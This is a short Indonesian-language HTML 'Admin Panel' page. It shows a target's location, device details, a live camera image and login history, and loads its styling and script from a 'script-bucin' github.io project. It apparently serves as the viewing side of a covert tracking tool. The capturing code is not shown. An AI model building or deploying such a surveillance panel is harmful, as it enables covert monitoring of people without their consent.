<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="https://kkykrnwn.github.io/script-bucin/css/admin.css">
</head>
<body>

    <div class="container">
        <h1>📊 Panel Admin</h1>

        <!-- 📍 Lokasi & Perangkat -->
        <div class="info">
            <p id="location-info">📍 Lokasi: Mengambil data...</p>
            <p id="device-info">📱 Perangkat: Mengambil data...</p>
        </div>

        <!-- 📷 Kamera Real-Time -->
        <div class="camera-section">
            <h2>📷 Kamera Pengguna</h2>
            <img id="camera-preview" src="" alt="Live Camera" class="camera">
        </div>

        <!-- 📝 Riwayat Login -->
        <div class="history-section">
            <h2>📝 Riwayat Login</h2>
            <ul id="login-history">
                <li>Data login belum tersedia.</li>
            </ul>
        </div>
    </div>

    <script src="https://kkykrnwn.github.io/script-bucin/js/admin.js"></script>
</body>
</html>
